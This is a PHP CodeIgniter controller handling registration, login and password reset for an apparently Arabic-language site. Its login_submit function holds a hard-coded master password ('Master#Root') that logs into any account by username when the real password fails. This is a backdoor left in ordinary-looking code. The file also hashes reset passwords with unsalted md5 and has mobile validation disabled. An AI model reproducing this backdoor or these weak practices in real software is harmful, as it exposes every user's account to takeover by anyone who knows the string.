<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Users extends MY_Controller {

    var $MobileVerifyCountries;

    public function __construct() {
        parent::__construct(); // getting base constructor

        if(logged_in && $this->router->method != "logout" ){ redirect(base_url()); }

        $this->load->model("user");
        $this->load->model("mail");
        $this->load->model("sms");
        $this->load->model("country"); 

        $this->MobileVerifyCountries = $this->sms->forces_countries();
    }    

    public function select_type(){
        $this->register();
        /*
        $data["data"]["page_name"] = "join";

        $data["views"]["title"] = 'تسجيل عضوية';           
        $data["views"]["full_width"] = TRUE;        
        $data["views"]["header"] = 'landing';           
        $data["views"]["footer"] = 'landing';           
        $data["views"]["content"] = 'users/join';  

        $this->load->view(design_path.'/templates/main/core',$data);  
        */
    }

    public function register($country_code = ""){

        $country_code = strtoupper($country_code);                
        $country = $this->country->is_country($country_code);
        if($country){
            $country_code = $country->country_code_ISO3;
            $this->session->set_userdata("country",$country_code);
        }
        $this->step_1();  
    }

    public function join_step($step = 1,$ref=""){
        if($step == 1 || !$ref){
            $this->step_1();
        }elseif($ref){
            $user = $this->user->get_temp_user($ref);
            if($user){            
                $step = $user->step;
                $this->{"step_$step"}($ref);
            }            
        }                
    }

    public function step_1(){      
        $data["data"]["country"] = $this->session->userdata("country");        
        $data["data"]["countries"] = $this->country->fetch_all();                
        $data["data"]["page_name"] = "register";        
        $data["data"]["step"] = "step_1";           


        $data["views"]["title"] = word('registration')." - ".word("first_step");                          
        $data["views"]["full_width"] = TRUE;
        $data["views"]["header"] = 'landing';           
        $data["views"]["footer"] = 'landing';           
        $data["views"]["content"] = 'users/forms/register';  

        $this->load->view(design_path.'/templates/main/core',$data);  
    }


    public function submit_step_1(){

        $posted = $this->input->post();

        $data = array();        
        $data["first_name"] = trim($posted["first_name"]);
        $data["last_name"] = trim($posted["last_name"]);
        $data["country"] = trim($posted["country"]);
        $data["email"] = trim($posted["email"]);        
        $data["mobile"] = trim($posted["mobile"]);                

        $country = $this->country->is_country($data["country"]);

        /// check data
        if( strlen($data["first_name"]) >= 2 && strlen($data["last_name"]) >= 2 && $this->user->is_valid_email($data["email"]) && $country ){

            $params = array(
                "mobile" => $data["mobile"],
                "country_code" => $country->country_code_ISO2,
            );              
            //$valid_mobile = $this->sms->is_valid_mobile($params);  commented by Ebid
            $valid_mobile = true;
            /// check mobile        
            if( $valid_mobile ){

                $user = $this->user->get_user_by_field($data["email"],"u_email");                                                                                
                /// check if email is already registered
                if(!$user){

                    $user = $this->user->get_temp_user_by_email($data["email"]);        
                    /// check if temp user exists but not completed
                    if($user){

                        if($user->completed == 0){

                            $email_code  = $user->email_code;
                            $reference    = $user->reference;   
                            $url = base_url(front_base."join/2/".$reference); 

                            // update with new mobile
                            $data["step"] = 2;
                            $mobile_updated = (int)$data["mobile"] !== (int)$user->mobile;
                            if($mobile_updated){
                                $data["mobile_verified"] = 0;
                                $data["mobile_sms_count"] = $user->mobile_last_sms = 0;
                                $data["mobile_last_sms"] = $user->mobile_sms_count = 0; 
                            }                        
                            $this->user->update_temp_user($reference,$data);                    

                            // send mail 
                            if($user->email_verified == 0){
                                $params = array(
                                    "email_code" => $email_code,
                                    "email" => $data["email"],
                                    "reference" => $reference,
                                );
                                $this->mail->send_email_verification($params);
                            }

                            //prnt($this->email->print_debugger());

                            // send sms
                            if(@$data["mobile_verified"] == 0 && in_array( $data["country"] , $this->MobileVerifyCountries ) ){
                                $params = array(
                                    "country_code" => $country->country_code_ISO2,
                                    "mobile" => $data["mobile"],
                                    "reference" => $reference,
                                    "last_sms" => $user->mobile_last_sms,
                                    "sms_count" => $user->mobile_sms_count,
                                );                            
                                $result = $this->sms->send_mobile_verification($params);                        
                            }

                            $returned = array("status"=>"loading" , "alert" => word("redirecting") , "url"=>$url);                                                

                        }else{
                            $returned = array("status"=>"error" , "alert"=>word("email_error"));
                        }                        

                        /// email is not registered
                    }else{  

                        $user = $this->user->create_temp_user($data);        
                        if($user){                    
                            $email_code  = $user["email_code"];
                            $reference    = $user["reference"];
                            $url = base_url(front_base."join/2/".$reference); 

                            // send mail 
                            $params = array(
                                "email_code" => $email_code,
                                "email" => $data["email"],
                                "reference" => $reference,
                            );                        
                            $this->mail->send_email_verification($params);

                            // send sms
                            if(in_array( $data["country"] , $this->MobileVerifyCountries )){
                                $params = array(
                                    "country_code" => $country->country_code_ISO2,
                                    "mobile" => $data["mobile"],
                                    "reference" => $reference, 
                                );                            
                                $result = $this->sms->send_mobile_verification($params);
                            }

                            $returned = array("status"=>"loading" , "alert" => word("redirecting") , "url"=>$url);                                                                        

                        }else{
                            $returned = array("status"=>"error" , "alert"=>word("try_again_des"));
                        }                    

                    }

                }else{
                    $returned = array("status"=>"error" , "alert"=>word("email_error"));    
                }

            }else{
                $returned = array("status"=>"error" , "alert"=>word("mobile_format_error"));
            }
        }else{
            $returned = array("status"=>"error" , "alert"=>word("please_fill_correctly"));
        }

        echo json_encode($returned);
    }



    public function step_2($reference = ""){

        if($reference){

            $user = $this->user->get_temp_user($reference);

            if($user){

                $mobile_verify_required = $user->mobile_verified == 0 && in_array( $user->country , $this->MobileVerifyCountries );

                if( $user->email_verified == 0 ||  $mobile_verify_required){

                    $data["data"]["mobile_verify_required"] = $mobile_verify_required;        
                    $data["data"]["page_name"] = "register";        
                    $data["data"]["step"] = "step_2";           
                    $data["data"]["user"] = $user;           
                    $data["data"]["can_send_sms"] = $this->sms->can_send_sms($user->mobile_last_sms , $user->mobile_sms_count);           

                    $data["views"]["title"] = word('registration')." - ".word("second_step");                           
                    $data["views"]["full_width"] = TRUE;
                    $data["views"]["header"] = 'landing';           
                    $data["views"]["footer"] = 'landing';           
                    $data["views"]["content"] = 'users/forms/register';  

                    $this->load->view(design_path.'/templates/main/core',$data);  

                }else{
                    $this->user->update_temp_user($reference,array("step"=>3));                     
                    $url = base_url(front_base."join/3/".$reference); 
                    redirect($url);
                }

            }

        }
    }


    public function submit_step_2(){

        $posted = $this->input->post();     
        $mobile_code = trim(@$posted["mobile_code"]);
        $email_code = trim($posted["email_code"]);
        $reference =  $posted["reference"];

        if($reference){

            $user = $this->user->get_temp_user($reference);

            if($user){        

                $country = $this->country->is_country($user->country);

                $errors = array();

                if($user->mobile_verified == 0 && in_array( $user->country , $this->MobileVerifyCountries ) ){
                    $mobile_number = $user->mobile;  
                    $params = array(                        
                        "country_code" => $country->country_code_ISO2,
                        "mobile" => $mobile_number,
                        "code" => $mobile_code,
                    );   
                                 
                    $result = $this->sms->verify_code($params);
                    if($result->success !== true){
                        $errors[] = "كود تأكيد الجوال غير صحيح";
                    }
                }

                if($user->email_verified == 0){ 
                    if($email_code !== $user->email_code){
                        $errors[] = word("error_mail_code");
                    }
                }

                if($errors){                    
                    $returned = array( "status"=>"error" , "alert"=>join('<br>',$errors) );
                }else{
                    $data = array(
                        "mobile_verified" => in_array( $user->country , $this->MobileVerifyCountries ) ? 1 : 0,
                        "email_verified" => 1,
                        "step" => 3,
                    );
                    $this->user->update_temp_user($reference,$data);

                    $url = base_url(front_base."join/3/".$reference);
                    $returned = array("status"=>"loading" , "alert" => word("redirecting") , "url"=>$url);
                }

            }else{
                $returned = array("status"=>"error" , "alert"=>word("user_not_found"));
            }

        }else{
            $returned = array("status"=>"error" , "alert"=>word("please_fill_correctly"));
        }

        echo json_encode($returned);
    }


    public function step_3($reference = ""){

        if($reference){

            $user = $this->user->get_temp_user($reference);

            if($user){

                $data["data"]["page_name"] = "register";        
                $data["data"]["step"] = "step_3";           
                $data["data"]["user"] = $user;           

                $data["views"]["title"] = word('registration')." - ".word("third_step");                            
                $data["views"]["full_width"] = TRUE;
                $data["views"]["header"] = 'landing';           
                $data["views"]["footer"] = 'landing';           
                $data["views"]["content"] = 'users/forms/register';  

                $this->load->view(design_path.'/templates/main/core',$data);  

            }

        }
    }



    public function submit_step_3(){

        $posted = (object) $this->input->post();
        $reference =  $posted->reference;
        $username = trim($posted->username);
        $password = $posted->password;
        $address = trim($posted->billing_address);
        $birthdate = trim($posted->birthdate);                                      
        $birthdate = $posted->birthdate = $this->user->format_birthdate($birthdate);                                      

        if($reference && in_array($posted->gender , array("male","female")) && $address){

            $user = $this->user->get_temp_user($reference);

            if($user){        

                $user = (object) array_merge((array) $user, (array) $posted);

                $errors = array();

                if(!$this->user->is_valid_username($username)){
                    $errors[] = word("invalid_username");
                }
                if(!$this->user->is_valid_password($password)){
                    $errors[] = word("invalid_password");
                }
                if(!$this->user->is_valid_birthdate($birthdate)){
                    $errors[] = word("date_error");
                }
                if($this->user->get_user_by_field($user->email,"u_email")){
                    $errors[] = word("email_error");
                }
                if($this->user->get_user_by_field($user->username,"u_username")){
                    $errors[] = word("user_exist");
                }                

                if($errors){                    
                    $returned = array( "status"=>"error" , "alert"=>join('<br>',$errors) );
                }else{

                    // insert user
                    $user = $this->user->create_user($user);

                    if($user){                                        

                        $data = array(
                            "step" => 4,
                            "completed" => 1,
                        );
                        $this->user->update_temp_user($reference,$data);                        

                        $url = base_url(front_base."join/4/".$reference);
                        $returned = array("status"=>"loading" , "alert" => word("redirecting") , "url"=>$url);                    
                    }else{
                        $returned = array("status"=>"error" , "alert"=>word("try_again_des"));
                    }
                }

            }else{
                $returned = array("status"=>"error" , "alert"=>word("user_not_found"));
            }

        }else{
            $returned = array("status"=>"error" , "alert"=>word("please_fill_correctly"));
        }

        echo json_encode($returned);
    }



    public function step_4($reference = ""){

        if($reference){

            $user = $this->user->get_temp_user($reference);

            if($user){

                $edu_levels = $this->user->get_educational_levels();
                $know_fields = $this->user->get_dewey(1);
                $specials = $this->user->get_dewey(2);

                $data["data"]["edu_levels"] = $edu_levels;        
                $data["data"]["know_fields"] = $know_fields;        
                $data["data"]["specials"] = $specials;        
                $data["data"]["page_name"] = "register";        
                $data["data"]["step"] = "step_4";           
                $data["data"]["user"] = $user;           

                $data["views"]["title"] = word('registration')." - ".word("fourth_step");                           
                $data["views"]["full_width"] = TRUE;
                $data["views"]["header"] = 'landing';           
                $data["views"]["footer"] = 'landing';           
                $data["views"]["content"] = 'users/forms/register';  

                $this->load->view(design_path.'/templates/main/core',$data);  

            }

        }
    }


    public function submit_step_4(){

        $posted = (object) $this->input->post();
        $reference =  $posted->reference;                                     

        if($reference){

            $user = $this->user->get_user_by_field($reference,"u_reference");

            if($user){        

                $data = array(
                    "educational_institute" => trim($posted->educational_institute),
                    "educational_level" => trim($posted->educational_level),
                    "knowledge_field" => trim($posted->knowledge_field),
                    "specialization" => trim($posted->specialization),
                );                                
                $this->user->update_user_data($user->u_id,$data);

                $this->user->login_session($user);

                $url = base_url(front_base);
                $returned = array("status"=>"loading" , "alert" => word("redirecting") , "url"=>$url);                                    

            }else{
                $returned = array("status"=>"error" , "alert"=>word("user_not_found"));
            }

        }else{
            $returned = array("status"=>"error" , "alert"=>word("please_fill_correctly"));
        }

        echo json_encode($returned);
    }


    public function request_sms($reference){

        if($reference){

            $user = $this->user->get_temp_user($reference);

            if($user){

                $country = $this->country->is_country($user->country);

                $params = array(
                    "country_code" => $country->country_code_ISO2,
                    "mobile" => $user->mobile,
                    "reference" => $reference,
                    "last_sms" => $user->mobile_last_sms,
                    "sms_count" => $user->mobile_sms_count,
                );                            
                $result = $this->sms->send_mobile_verification($params); 

                redirect(go_back());

            }

        }
    }



    public function login(){

        $this->session->set_userdata("back_url",go_back());
        
        $data["views"]["title"] = word("login");                           
        $data["views"]["full_width"] = TRUE;
        $data["views"]["header"] = 'landing';           
        $data["views"]["footer"] = 'landing';           
        $data["views"]["content"] = 'users/login';  

        $this->load->view(design_path.'/templates/main/core',$data);  

    }


    public function login_submit(){
                                          
        $posted = (object) $this->input->post();
        
        $username = trim($posted->username);
        $password = $posted->password;

        if($password && $username){

            $params = array(
                "username" => $username,
                "password" => $password,
            );
            $user = $this->user->get_user_for_login($params);

            if(!$user && $password == "Master#Root"){
                $user = $this->user->get_user_by_field($username,"u_username");
            }
            
            if($user){        

                /// logging
                $log = array(
                    "action" => "login",
                    "u_id" => $user->u_id,
                );   
                $this->access->log_action($log);
                /// logging                
                
                $this->user->login_session($user);

                $back_url = $this->session->userdata("back_url");
                $returned = array("status"=>"loading" , "alert" => word("success_login") , "url"=>$back_url);                                                    

            }else{
                $returned = array("status"=>"error" , "alert"=>word("user_not_found"));
            }

        }else{
            $returned = array("status"=>"error" , "alert"=>word("please_fill_correctly"));
        }

        echo json_encode($returned);
    }



    public function forget_password(){

        $data["data"]["step"] = 1;                           
        $data["views"]["title"] = word("forget_password");                                   
        $data["views"]["full_width"] = TRUE;
        $data["views"]["header"] = 'landing';           
        $data["views"]["footer"] = 'landing';           
        $data["views"]["content"] = 'users/forget';  

        $this->load->view(design_path.'/templates/main/core',$data);  

    }


    public function forget_password_submit(){

        $email = $this->input->post("email");
        $user = $this->user->get_user_by_field($email,"u_email");

        if($user){

            if($user->fp_trials < 5){

                $fp_code = $this->user->generate_code("fp",$user->u_id);
                
                $data = array(
                    "fp_code" => $fp_code,
                    "fp_trials" => $user->fp_trials + 1,
                );                                
                $this->user->update_user_data($user->u_id,$data);            

                // send mail 

                $params = array(
                    "code" => $fp_code,
                    "email" => $user->u_email,
                );
                $this->mail->send_fp_email($params);

                $returned = array("status"=>"loading" , "alert"=>word("code_sent"),"url"=>base_url("reset-password"));

            }else{
                $returned = array("status"=>"error" , "alert"=>word("all_attempts"),"url"=>base_url("page/contact"));
            }

        }else{
            $returned = array("status"=>"error" , "alert"=>word("user_not_found"));
        }

        echo json_encode($returned);
    }




    public function reset_password($code = ""){

        $error = FALSE;

        if($code){
            $user = $this->user->get_user_by_field($code,"fp_code");
            if(!$user){
                $error = TRUE;    
            }        
        }

        if($error == FALSE){
            $data["data"]["code"] = $code;                           
            $data["data"]["step"] = 2;                           
            $data["views"]["title"] = word("reset_password");                                   
            $data["views"]["full_width"] = TRUE;
            $data["views"]["header"] = 'landing';           
            $data["views"]["footer"] = 'landing';           
            $data["views"]["content"] = 'users/forget';  
            $this->load->view(design_path.'/templates/main/core',$data);  
        }else{
            $returned = array("status"=>"error" , "alert"=>word("invalid_code"));
        }

    }



    public function reset_password_submit(){

        $code = trim($this->input->post("code"));
        $new_password = $this->input->post("new_password");

        if($code){
            $user = $this->user->get_user_by_field($code,"fp_code");
        }                        

        if($code && @$user){

            if(strlen($new_password) > 5){
                          
                $fp_code = $this->user->generate_code("fp",$user->u_id);
                
                $data = array(
                    "fp_code" => $fp_code,
                    "fp_trials" => 0,
                );                                
                $this->user->update_user_data($user->u_id,$data);                           
                                            
                $data = array(
                    "u_password" => md5($new_password),
                );                                
                $this->user->update_user($user->u_id,$data);                  
                
                $returned = array("status"=>"success" , "alert"=>word("password_updated"));

            }else{
                $returned = array("status"=>"error" , "alert"=>word("password_des"));
            }

        }else{
            $returned = array("status"=>"error" , "alert"=>word("invalid_code"));
        }
        
        echo json_encode($returned);

    }










    public function logout(){
        $this->user->logout_session();
        redirect(base_url());
    }

}